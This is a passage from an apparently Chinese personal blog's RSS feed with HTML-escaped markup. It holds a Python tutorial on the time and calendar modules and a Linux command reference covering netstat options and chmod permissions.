&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strftime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%a %b %d %H:%M:%S %Y&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;localtime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 将格式字符串转换为时间戳&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Sat Mar 28 22:24:24 2016&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mktime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strptime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;%a %b %d %H:%M:%S %Y&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
2021-09-27 01:28:18
Mon Sep 27 01:28:18 2021
1459175064.0
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;python中时间日期格式化符号&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;%y 两位数的年份表示（00-99）&lt;/li&gt;
&lt;li&gt;%Y 四位数的年份表示（000-9999）&lt;/li&gt;
&lt;li&gt;%m 月份（01-12）&lt;/li&gt;
&lt;li&gt;%d 月内中的一天（0-31）&lt;/li&gt;
&lt;li&gt;%H 24小时制小时数（0-23）&lt;/li&gt;
&lt;li&gt;%I 12小时制小时数（01-12）&lt;/li&gt;
&lt;li&gt;%M 分钟数（00-59）&lt;/li&gt;
&lt;li&gt;%S 秒（00-59）&lt;/li&gt;
&lt;li&gt;%a 本地简化星期名称&lt;/li&gt;
&lt;li&gt;%A 本地完整星期名称&lt;/li&gt;
&lt;li&gt;%b 本地简化的月份名称&lt;/li&gt;
&lt;li&gt;%B 本地完整的月份名称&lt;/li&gt;
&lt;li&gt;%c 本地相应的日期表示和时间表示&lt;/li&gt;
&lt;li&gt;%j 年内的一天（001-366）&lt;/li&gt;
&lt;li&gt;%p 本地A.M.或P.M.的等价符&lt;/li&gt;
&lt;li&gt;%U 一年中的星期数（00-53）星期天为星期的开始&lt;/li&gt;
&lt;li&gt;%w 星期（0-6），星期天为星期的开始&lt;/li&gt;
&lt;li&gt;%W 一年中的星期数（00-53）星期一为星期的开始&lt;/li&gt;
&lt;li&gt;%x 本地相应的日期表示&lt;/li&gt;
&lt;li&gt;%X 本地相应的时间表示&lt;/li&gt;
&lt;li&gt;%Z 当前时区的名称&lt;/li&gt;
&lt;li&gt;%% %号本身&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;获取某月日历&#34;&gt;&lt;a href=&#34;#获取某月日历&#34; class=&#34;headerlink&#34; title=&#34;获取某月日历&#34;&gt;&lt;/a&gt;获取某月日历&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; calendar

cal &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; calendar&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;month&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2016&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;以下输出2016年1月份的日历:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cal&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
以下输出2016年1月份的日历:
    January 2016
Mo Tu We Th Fr Sa Su
             1  2  3
 4  5  6  7  8  9 10
11 12 13 14 15 16 17
18 19 20 21 22 23 24
25 26 27 28 29 30 31
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;Time-模块&#34;&gt;&lt;a href=&#34;#Time-模块&#34; class=&#34;headerlink&#34; title=&#34;Time 模块&#34;&gt;&lt;/a&gt;Time 模块&lt;/h3&gt;&lt;p&gt;Time 模块包含了以下内置函数，既有时间处理的，也有转换时间格式的&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;函数及描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python/att-time-altzone.html&#34;&gt;time.altzone&lt;/a&gt; 返回格林威治西部的夏令时地区的偏移秒数。如果该地区在格林威治东部会返回负值（如西欧，包括英国）。对夏令时启用地区才能使用。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[time.asctime(&lt;a href=&#34;https://www.runoob.com/python/att-time-asctime.html&#34;&gt;tupletime])&lt;/a&gt; 接受时间元组并返回一个可读的形式为”Tue Dec 11 18:07:14 2008”（2008年12月11日 周二18时07分14秒）的24个字符的字符串。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python/att-time-clock.html&#34;&gt;time.clock( )&lt;/a&gt; 用以浮点数计算的秒数返回当前的CPU时间。用来衡量不同程序的耗时，比time.time()更有用。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[time.ctime(&lt;a href=&#34;https://www.runoob.com/python/att-time-ctime.html&#34;&gt;secs])&lt;/a&gt; 作用相当于asctime(localtime(secs))，未给参数相当于asctime()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[time.gmtime(&lt;a href=&#34;https://www.runoob.com/python/att-time-gmtime.html&#34;&gt;secs])&lt;/a&gt; 接收时间戳（1970纪元后经过的浮点秒数）并返回格林威治天文时间下的时间元组t。注：t.tm_isdst始终为0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[time.localtime(&lt;a href=&#34;https://www.runoob.com/python/att-time-localtime.html&#34;&gt;secs])&lt;/a&gt; 接收时间戳（1970纪元后经过的浮点秒数）并返回当地时间下的时间元组t（t.tm_isdst可取0或1，取决于当地当时是不是夏令时）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python/att-time-mktime.html&#34;&gt;time.mktime(tupletime)&lt;/a&gt; 接受时间元组并返回时间戳（1970纪元后经过的浮点秒数）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python/att-time-sleep.html&#34;&gt;time.sleep(secs)&lt;/a&gt; 推迟调用线程的运行，secs指秒数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[time.strftime(fmt&lt;a href=&#34;https://www.runoob.com/python/att-time-strftime.html&#34;&gt;,tupletime])&lt;/a&gt; 接收以时间元组，并返回以可读字符串表示的当地时间，格式由fmt决定。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python/att-time-strptime.html&#34;&gt;time.strptime(str,fmt=’%a %b %d %H:%M:%S %Y’)&lt;/a&gt; 根据fmt的格式把一个时间字符串解析为时间元组。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python/att-time-time.html&#34;&gt;time.time( )&lt;/a&gt; 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;12&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python/att-time-tzset.html&#34;&gt;time.tzset()&lt;/a&gt; 根据环境变量TZ重新初始化时间相关设置。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Time模块包含了以下2个非常重要的属性：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;属性及描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;time.timezone&lt;/strong&gt; 属性 time.timezone 是当地时区（未启动夏令时）距离格林威治的偏移秒数（&amp;gt;0，美洲&amp;lt;=0大部分欧洲，亚洲，非洲）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;time.tzname&lt;/strong&gt; 属性time.tzname包含一对根据情况的不同而不同的字符串，分别是带夏令时的本地时区名称，和不带的。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;日历（Calendar）模块&#34;&gt;&lt;a href=&#34;#日历（Calendar）模块&#34; class=&#34;headerlink&#34; title=&#34;日历（Calendar）模块&#34;&gt;&lt;/a&gt;日历（Calendar）模块&lt;/h3&gt;&lt;p&gt;此模块的函数都是日历相关的，例如打印某月的字符月历。&lt;/p&gt;
&lt;p&gt;星期一是默认的每周第一天，星期天是默认的最后一天。更改设置需调用calendar.setfirstweekday()函数。模块包含了以下内置函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;序号&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;函数及描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;1&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.calendar(year,w=2,l=1,c=6)&lt;/strong&gt; 返回一个多行字符串格式的year年年历，3个月一行，间隔距离为c。 每日宽度间隔为w字符。每行长度为21* W+18+2* C。l是每星期行数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;2&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.firstweekday( )&lt;/strong&gt; 返回当前每周起始日期的设置。默认情况下，首次载入 calendar 模块时返回 0，即星期一。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;3&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.isleap(year)&lt;/strong&gt; 是闰年返回 True，否则为 False。&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import calendar &amp;gt;&amp;gt;&amp;gt; print(calendar.isleap(2000)) True &amp;gt;&amp;gt;&amp;gt; print(calendar.isleap(1900)) False&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;4&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.leapdays(y1,y2)&lt;/strong&gt; 返回在Y1，Y2两年之间的闰年总数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;5&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.month(year,month,w=2,l=1)&lt;/strong&gt; 返回一个多行字符串格式的year年month月日历，两行标题，一周一行。每日宽度间隔为w字符。每行的长度为7* w+6。l是每星期的行数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;6&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.monthcalendar(year,month)&lt;/strong&gt; 返回一个整数的单层嵌套列表。每个子列表装载代表一个星期的整数。Year年month月外的日期都设为0;范围内的日子都由该月第几日表示，从1开始。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;7&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.monthrange(year,month)&lt;/strong&gt; 返回两个整数。第一个是该月的星期几的日期码，第二个是该月的日期码。日从0（星期一）到6（星期日）;月从1到12。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.prcal(year,w=2,l=1,c=6)&lt;/strong&gt; 相当于 **print calendar.calendar(year,w=2,l=1,c=6)**。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;9&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.prmonth(year,month,w=2,l=1)&lt;/strong&gt; 相当于 &lt;strong&gt;print calendar.month(year,month,w=2,l=1)&lt;/strong&gt; 。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;10&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.setfirstweekday(weekday)&lt;/strong&gt; 设置每周的起始日期码。0（星期一）到6（星期日）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;11&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.timegm(tupletime)&lt;/strong&gt; 和time.gmtime相反：接受一个时间元组形式，返回该时刻的时间戳（1970纪元后经过的浮点秒数）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;12&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;strong&gt;calendar.weekday(year,month,day)&lt;/strong&gt; 返回给定日期的日期码。0（星期一）到6（星期日）。月份为 1（一月） 到 12（12月）。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;待更新&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://0xdadream.github.io/2021/09/08/linux-ming-ling/</guid>
            <title>linux命令</title>
            <link>https://0xdadream.github.io/2021/09/08/linux-ming-ling/</link>
            <category>linux</category>
            <category>学习</category>
            <pubDate>Wed, 08 Sep 2021 02:11:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;linux命令&#34;&gt;&lt;a href=&#34;#linux命令&#34; class=&#34;headerlink&#34; title=&#34;linux命令&#34;&gt;&lt;/a&gt;linux命令&lt;/h1&gt;&lt;h2 id=&#34;netstat-查看Linux中网络系统状态信息&#34;&gt;&lt;a href=&#34;#netstat-查看Linux中网络系统状态信息&#34; class=&#34;headerlink&#34; title=&#34;netstat-查看Linux中网络系统状态信息&#34;&gt;&lt;/a&gt;netstat-查看Linux中网络系统状态信息&lt;/h2&gt;&lt;p&gt;选项&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;-a或--all：显示所有连线中的Socket；
-A&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;网络类型&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;或--&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;网络类型&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;：列出该网络类型连线中的相关地址；
-c或--continuous：持续列出网络状态；
-C或--cache：显示路由器配置的快取信息；
-e或--extend：显示网络其他相关信息；
-F或--fib：显示FIB；
-g或--groups：显示多重广播功能群组组员名单；
-h或--help：在线帮助；
-i或--interfaces：显示网络界面信息表单；
-l或--listening：显示监控中的服务器的Socket；
-M或--masquerade：显示伪装的网络连线；
-n或--numeric：直接使用ip地址，而不通过域名服务器；
-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；
-o或--timers：显示计时器；
-p或--programs：显示正在使用Socket的程序识别码和程序名称；
-r或--route：显示Routing Table；
-s或--statistice：显示网络工作信息统计表；
-t或--tcp：显示TCP传输协议的连线状况；
-u或--udp：显示UDP传输协议的连线状况；
-v或--verbose：显示指令执行过程；
-V或--version：显示版本信息；
-w或--raw：显示RAW传输协议的连线状况；
-x或--unix：此参数的效果和指定&lt;span class=&#34;token string&#34;&gt;&#34;-A unix&#34;&lt;/span&gt;参数相同；
--ip或--inet：此参数的效果和指定&lt;span class=&#34;token string&#34;&gt;&#34;-A inet&#34;&lt;/span&gt;参数相同。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;chmod&#34;&gt;&lt;a href=&#34;#chmod&#34; class=&#34;headerlink&#34; title=&#34;chmod&#34;&gt;&lt;/a&gt;chmod&lt;/h2&gt;&lt;p&gt;&lt;code&gt;chmod&lt;/code&gt; 命令在 Unix 和类 Unix 操作系统中用于更改文件和目录的权限。&lt;/p&gt;
&lt;h3 id=&#34;基本用法&#34;&gt;&lt;a href=&#34;#基本用法&#34; class=&#34;headerlink&#34; title=&#34;基本用法&#34;&gt;&lt;/a&gt;基本用法&lt;/h3&gt;&lt;p&gt;&lt;code&gt;chmod&lt;/code&gt; 命令的一般语法是：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;选项&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; 模式 文件&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;模式&lt;/strong&gt;：指定要设置的权限。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件&lt;/strong&gt;：指定要更改权限的文件或目录。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;权限表示&#34;&gt;&lt;a href=&#34;#权限表示&#34; class=&#34;headerlink&#34; title=&#34;权限表示&#34;&gt;&lt;/a&gt;权限表示&lt;/h3&gt;&lt;p&gt;权限可以用符号或数字来表示。&lt;/p&gt;
&lt;h3 id=&#34;符号表示&#34;&gt;&lt;a href=&#34;#符号表示&#34; class=&#34;headerlink&#34; title=&#34;符号表示&#34;&gt;&lt;/a&gt;符号表示&lt;/h3&gt;&lt;p&gt;权限由三组三个字符表示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一组字符是文件所有者（用户）的权限。&lt;/li&gt;
&lt;li&gt;第二组字符是文件所有者所属组的权限。&lt;/li&gt;
&lt;li&gt;第三组字符是其他用户的权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每组可以有以下字符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;r&lt;/code&gt;（读）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;w&lt;/code&gt;（写）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x&lt;/code&gt;（执行）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;rwxr-xr--&lt;/code&gt; 表示文件所有者有读、写、执行权限；组有读、执行权限；其他用户只有读权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数字表示&#34;&gt;&lt;a href=&#34;#数字表示&#34; class=&#34;headerlink&#34; title=&#34;数字表示&#34;&gt;&lt;/a&gt;数字表示&lt;/h3&gt;&lt;p&gt;权限也可以用八进制（base-8）数字表示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读由 &lt;code&gt;4&lt;/code&gt; 表示。&lt;/li&gt;
&lt;li&gt;写由 &lt;code&gt;2&lt;/code&gt; 表示。&lt;/li&gt;
&lt;li&gt;执行由 &lt;code&gt;1&lt;/code&gt; 表示。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;权限的总和表示最终权限：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;7&lt;/code&gt;（读 + 写 + 执行）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;6&lt;/code&gt;（读 + 写）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;5&lt;/code&gt;（读 + 执行）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;4&lt;/code&gt;（只有读）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;（没有权限）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;755&lt;/code&gt; 表示文件所有者有 &lt;code&gt;7&lt;/code&gt;（读、写、执行），组有 &lt;code&gt;5&lt;/code&gt;（读、执行），其他用户有 &lt;code&gt;5&lt;/code&gt;（读、执行）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;示例&#34;&gt;&lt;a href=&#34;#示例&#34; class=&#34;headerlink&#34; title=&#34;示例&#34;&gt;&lt;/a&gt;示例&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;符号表示更改权限：&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; u+x file.txt&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;给 &lt;code&gt;file.txt&lt;/code&gt; 的所有者添加执行权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;数字表示更改权限：&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;644&lt;/span&gt; file.txt&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;设置 &lt;code&gt;file.txt&lt;/code&gt; 的所有者有读和写权限，组和其他用户只有读权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;递归更改权限：&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-R&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;755&lt;/span&gt; /path/to/directory&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;设置 &lt;code&gt;/path/to/directory&lt;/code&gt; 内所有文件和目录的权限。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;选项&#34;&gt;&lt;a href=&#34;#选项&#34; class=&#34;headerlink&#34; title=&#34;选项&#34;&gt;&lt;/a&gt;选项&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-R&lt;/code&gt;：递归更改文件和目录的权限。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v&lt;/code&gt;：详细模式。对每个处理的文件输出诊断信息。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt;：类似详细模式，但仅在更改时报告。&lt;/li&gt;
&lt;/ul&gt;
